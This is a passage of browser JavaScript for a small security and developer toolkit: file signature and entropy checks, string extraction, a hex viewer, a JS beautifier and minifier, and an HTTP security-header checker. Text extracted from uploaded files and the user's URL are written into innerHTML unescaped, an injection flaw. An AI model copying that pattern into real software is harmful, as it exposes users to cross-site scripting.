            '1f 8b': 'GZIP Archive',
            '42 5a 68': 'BZIP2 Archive',
            '37 7a bc af': '7-Zip Archive'
        };

        let detectedType = 'Unknown';
        for (let sig in signatures) {
            if (header.startsWith(sig)) {
                detectedType = signatures[sig];
                break;
            }
        }

        result += `Detected Type: ${detectedType}\n\n`;

        // Calculate file entropy
        const entropy = calculateFileEntropy(uint8Array);
        result += `File Entropy: ${entropy.toFixed(4)} bits\n`;
        result += `Entropy Analysis: ${entropy > 7.5 ? 'High (likely encrypted/compressed)' : 'Low (likely plain text/uncompressed)'}\n\n`;

        // Extract printable strings
        const strings = extractPrintableStrings(uint8Array);
        if (strings.length > 0) {
            result += `Printable Strings Found: ${strings.length}\n`;
            result += `Sample Strings:\n${strings.slice(0, 10).join('\n')}\n`;
            if (strings.length > 10) {
                result += '...(truncated)\n';
            }
        } else {
            result += 'No printable strings found.\n';
        }

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('Metadata extracted successfully!', 'success');
    };
    reader.readAsArrayBuffer(file);
}

function calculateFileEntropy(uint8Array) {
    const freq = new Array(256).fill(0);
    for (let byte of uint8Array) {
        freq[byte]++;
    }

    let entropy = 0;
    const length = uint8Array.length;
    for (let count of freq) {
        if (count > 0) {
            const p = count / length;
            entropy -= p * Math.log2(p);
        }
    }
    return entropy;
}

function extractPrintableStrings(uint8Array) {
    const minLength = 4;
    const strings = [];
    let currentString = '';

    for (let i = 0; i < uint8Array.length; i++) {
        const byte = uint8Array[i];
        if (byte >= 32 && byte <= 126) {
            currentString += String.fromCharCode(byte);
        } else {
            if (currentString.length >= minLength) {
                strings.push(currentString);
            }
            currentString = '';
        }
    }

    return strings.filter(s => s.length >= minLength);
}

// Hex viewer function
function viewHex() {
    const fileInput = document.getElementById('hexViewerFile');
    const textInput = document.getElementById('hexViewerInput').value;
    const output = document.getElementById('hexViewerOutput');

    if (fileInput.files[0]) {
        const file = fileInput.files[0];
        const reader = new FileReader();

        reader.onload = function(e) {
            const arrayBuffer = e.target.result;
            const uint8Array = new Uint8Array(arrayBuffer);
            const hexView = Array.from(uint8Array)
                .map(byte => byte.toString(16).padStart(2, '0'))
                .join(' ');
            output.textContent = hexView;
            showMessage('Hex view generated!', 'success');
        };
        reader.readAsArrayBuffer(file);
    } else if (textInput) {
        // Convert hex input to formatted hex view
        output.textContent = textInput;
        showMessage('Hex view generated from input!', 'success');
    } else {
        showMessage('Please upload a file or enter hex data.', 'error');
    }
}

// JavaScript beautifier functions
function beautifyJS() {
    const jsInput = document.getElementById('jsInput').value;
    const output = document.getElementById('jsOutput');

    if (!jsInput.trim()) {
        showMessage('Please enter JavaScript code to beautify', 'error');
        return;
    }

    try {
        let beautified;
        if (typeof js_beautify !== 'undefined') {
            beautified = js_beautify(jsInput, {
                indent_size: 2,
                space_in_empty_paren: true
            });
        } else {
            // Fallback beautifier
            beautified = jsInput
                .replace(/\{/g, '{\n  ')
                .replace(/\}/g, '\n}')
                .replace(/;/g, ';\n')
                .replace(/,/g, ',\n  ')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line.length > 0)
                .join('\n');
        }
        output.textContent = beautified;
        showMessage('JavaScript code beautified!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid JavaScript code';
        showMessage('Beautify failed!', 'error');
    }
}

function minifyJS() {
    const jsInput = document.getElementById('jsInput').value;
    const output = document.getElementById('jsOutput');

    if (!jsInput.trim()) {
        showMessage('Please enter JavaScript code to minify', 'error');
        return;
    }

    try {
        // Simple minification by removing extra whitespace and comments
        const minified = jsInput
            .replace(/\/\*[\s\S]*?\*\//g, '') // Remove multi-line comments
            .replace(/\/\/.*$/gm, '') // Remove single-line comments
            .replace(/\s+/g, ' ') // Replace multiple whitespace with single space
            .replace(/;\s+/g, ';') // Remove space after semicolons
            .replace(/,\s+/g, ',') // Remove space after commas
            .replace(/\{\s+/g, '{') // Remove space after opening braces
            .replace(/\s+\}/g, '}') // Remove space before closing braces
            .trim();

        output.textContent = minified;
        showMessage('JavaScript code minified!', 'success');
    } catch (error) {
        output.textContent = 'Error: Invalid JavaScript code';
        showMessage('Minify failed!', 'error');
    }
}

// Header analyzer function
async function analyzeHeaders() {
    const url = document.getElementById('headerUrl').value;
    const output = document.getElementById('headerOutput');

    if (!url) {
        showMessage('Please enter a URL to analyze', 'error');
        return;
    }

    let result = `<strong>Security Header Analysis:</strong>\n\n`;
    result += `Target URL: ${url}\n`;
    result += `Analysis Time: ${new Date().toLocaleString()}\n\n`;

    try {
        // Use a CORS proxy or simulate analysis
        const corsProxy = 'https://api.allorigins.win/raw?url=';
        const proxyUrl = corsProxy + encodeURIComponent(url);
        
        try {
            const response = await fetch(proxyUrl, {
                method: 'HEAD',
                mode: 'cors'
            });
            
            if (response.ok) {
                let headersText = '';
                for (let [key, value] of response.headers.entries()) {
                    headersText += `${key}: ${value}\n`;
                }

                // Security header analysis
                let securityAnalysis = '<strong>Security Headers Status:</strong>\n';
                const securityHeaders = {
                    'Content-Security-Policy': 'CSP protects against XSS and data injection',
                    'X-Frame-Options': 'Prevents clickjacking attacks',
                    'Strict-Transport-Security': 'Enforces HTTPS connections',
                    'X-Content-Type-Options': 'Prevents MIME type sniffing',
                    'X-XSS-Protection': 'Legacy XSS protection (deprecated)',
                    'Referrer-Policy': 'Controls referrer information',
                    'Permissions-Policy': 'Controls browser feature permissions'
                };

                for (const [header, description] of Object.entries(securityHeaders)) {
                    if (response.headers.has(header)) {
                        securityAnalysis += `✅ ${header}: Present - ${description}\n`;
                    } else {
                        securityAnalysis += `❌ ${header}: Missing - ${description}\n`;
                    }
                }

                result += securityAnalysis + '\n<strong>Raw Headers:</strong>\n' + headersText;
            } else {
                throw new Error('Failed to fetch headers');
            }
        } catch (fetchError) {
            // Fallback analysis without actual headers
            result += '<strong>Note:</strong> Could not fetch headers due to CORS restrictions.\n';
            result += 'Performing simulated security analysis...\n\n';
            
            result += '<strong>Common Security Headers to Check:</strong>\n';
            result += '• Content-Security-Policy: Protects against XSS\n';
            result += '• X-Frame-Options: Prevents clickjacking\n';
            result += '• Strict-Transport-Security: Enforces HTTPS\n';
            result += '• X-Content-Type-Options: Prevents MIME sniffing\n';
            result += '• X-XSS-Protection: Legacy XSS protection\n';
            result += '• Referrer-Policy: Controls referrer info\n';
            result += '• Permissions-Policy: Controls browser features\n\n';
            
            result += '<strong>Recommended Tools:</strong>\n';
            result += '• Use curl: curl -I ' + url + '\n';
            result += '• Use browser dev tools Network tab\n';
            result += '• Online header analyzers\n';
        }

        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('Header analysis completed!', 'success');
    } catch (error) {
        result += `<strong>Error:</strong> ${error.message}\n\n`;
        result += '<strong>Manual Analysis Options:</strong>\n';
        result += `• Browser DevTools: Open Network tab and visit ${url}\n`;
        result += `• Command line: curl -I "${url}"\n`;
        result += '• Online tools: securityheaders.com\n';
        
        output.innerHTML = `<pre>${result}</pre>`;
        showMessage('Analysis completed with limitations', 'info');
    }
}
